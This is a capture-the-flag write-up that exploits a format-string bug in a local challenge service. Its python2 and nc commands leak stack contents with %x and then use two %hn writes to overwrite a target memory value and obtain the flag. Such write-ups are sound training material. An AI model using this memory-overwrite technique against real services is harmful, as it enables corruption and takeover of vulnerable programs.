# Writeup

Let's connect to the service first:
```
nc 127.0.0.1 7778
Change 0xdeadbeef (at 0x80499ac) to 0xabadcafe
Enter a nice message:
```

Okay, so our goal is to overwrite the value at `0x80499ac` with `0xabadcafe`.
First, let's check what's on the stack:
```
$ python2 -c 'print "AAAA" + "%x."*10' | nc 127.0.0.1 7778
Change 0xdeadbeef (at 0x80499ac) to 0xabadcafe
Enter a nice message: You entered: 
AAAA3f.f7fd1c20.0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
Sorry, no flag for you :(
Value: deadbeef
```

Nice! The fourth parameter printed from the stack is the start of our input (`AAAA`). This means that we can use the `%hn` format specifier to write values to this address. Let's change it to `0x80499ac` and see what happens when we write to it:

```
$ python2 -c 'print "\xac\x99\x04\x08" + "%x%x" + "%08x" + "%hn"' | nc 127.0.0.1 7778
Change 0xdeadbeef (at 0x80499ac) to 0xabadcafe
Enter a nice message: You entered: 
��3ff7fd1c2000000000
Sorry, no flag for you :(
Value: dead0016
```

Sweet! However, we can only overwrite the last 2 bytes, so we have to use another `%hn` to overwrite the two higher bytes as well. We need an extra argument in between the two addresses to be able to control the value of the upper bytes.
```
$ python2 -c 'print "\xac\x99\x04\x08ASDF\xae\x99\x04\x08" + "%x%x" + "%08x" + "%hn" + "%08x" + "%hn"' | nc 127.0.0.1 7778
Change 0xdeadbeef (at 0x80499ac) to 0xabadcafe
Enter a nice message: You entered: 
��ASDF��3ff7fd1c200000000046445341
Sorry, no flag for you :(
Value: 26001e
```

One way of getting the correct values now is to use the formula `wanted - current + 8` (+8 because we're printing with `%08x`).


```
$ python2 -c 'print "\xac\x99\x04\x08ASDF\xae\x99\x04\x08" + "%x%x" + "%51944x" + "%hn" + "%08x" + "%hn"' | nc 127.0.0.1 7778
[lots of crap]
Sorry, no flag for you :(
Value: cb06cafe
```

`0xabad - 0xcb06 + 8 = -8017`, so we have to add a `1` to `abad``. `0x1abad - 0xcb06 + 8 = 57519`.

```
python2 -c 'print "\xac\x99\x04\x08ASDF\xae\x99\x04\x08" + "%x%x" + "%51944x" + "%hn" + "%57519x" + "%hn"' | nc 127.0.0.1 7778
[...]
Success! The flag is: TG16{overWrit3_that_shit_y0}
```
